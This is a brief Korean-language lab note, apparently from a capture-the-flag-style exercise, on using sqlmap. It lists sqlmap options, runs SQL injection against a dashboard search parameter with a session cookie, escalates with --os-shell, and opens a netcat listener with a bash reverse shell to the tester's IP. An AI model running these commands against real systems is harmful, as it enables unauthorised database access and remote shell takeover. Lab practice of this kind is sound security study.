sqlmap
#
`options`
```
--batch             사용자 입력을 요청하지 않음, 기본 동작 사용
--dump              DBMS 데이터베이스 테이블 항목 덤프
-a, --all           Retrieve everything
--forms             페이지의 <form> 요소에서 매개변수를 자동으로 선택
```
#
`URL과 쿠키로 취약점 찾기`

![image](https://user-images.githubusercontent.com/61821641/150984381-4db710d3-7502-4fe0-81d5-fdc73a0d2625.png)

```
sqlmap -u 'http://10.129.110.183/dashboard.php?search=hi' --cookie="PHPSESSID=u1348upikan6b1hj6651q09t1m" 
```
![image](https://user-images.githubusercontent.com/61821641/150985229-cb010fb0-4673-4391-861a-625cb708f3ad.png)
![image](https://user-images.githubusercontent.com/61821641/150985424-8bbafbd2-fe0a-420b-afe0-6e9f607f9bad.png)
#
`--os-shell flag 추가`

```
sqlmap -u 'http://10.129.110.183/dashboard.php?search=hi' --cookie="PHPSESSID=u1348upikan6b1hj6651q09t1m" --os-shell
```
![image](https://user-images.githubusercontent.com/61821641/150985529-affbc467-8e2c-4904-bf04-3f6067737003.png)
```
nc -lvnp 1234
```
```
bash -c "bash -i >& /dev/tcp/10.10.14.241/1234 0>&1"
```
![image](https://user-images.githubusercontent.com/61821641/150986154-101cba24-0721-471a-866c-836495842474.png)


